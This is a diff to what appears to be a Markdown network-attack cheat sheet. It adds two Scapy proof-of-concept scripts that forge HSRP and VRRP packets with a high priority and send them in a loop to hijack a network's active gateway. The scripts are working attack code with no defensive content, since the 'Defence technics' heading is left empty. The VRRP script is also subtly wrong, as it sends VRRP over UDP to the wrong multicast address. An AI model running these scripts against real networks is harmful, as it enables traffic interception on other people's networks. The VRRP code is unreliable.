@@ -298,7 +298,32 @@ Allows to monitor network state, watching the DAD process and NS messages. DAD s
 **Сomplexity:** High  
 **Relevance:** High  
 **Description:**  
-**Attack tools**  
+**Attack tools**
+Scapy is the easiest way to create PoC and hijack active node status:
+
+For HSRP:
+```python
+#!/usr/bin/env python
+from scapy.all import *
+
+if __name__ == "__main__":
+    ip = IP(src="10.0.0.100", dst="224.0.0.2")
+    udp = UDP(sport=1985, dport=1985)
+    hsrp = HSRP(group=1, priority=150, virtualIP="10.0.0.1", auth="cisco")
+    send(ip/udp/hsrp, iface="eth1", inter=3, loop=1)
+```
+
+For VRRP:
+```python
+#!/usr/bin/env python
+from scapy.all import *
+
+if __name__ == "__main__":
+    ip = IP(src="10.0.0.100", dst="224.0.0.2")
+    udp = UDP()
+    vrrp = VRRP(vrid=1, priority=150, addrlist=["10.0.0.7", "10.0.0.8"], ipcount=2, auth1='cisco')
+    send(ip/udp/vrrp, iface="eth1", inter=3, loop=1)
+```
 **Defence technics**  
 
 ### Dynamic routing protocol spoofing (BGP)
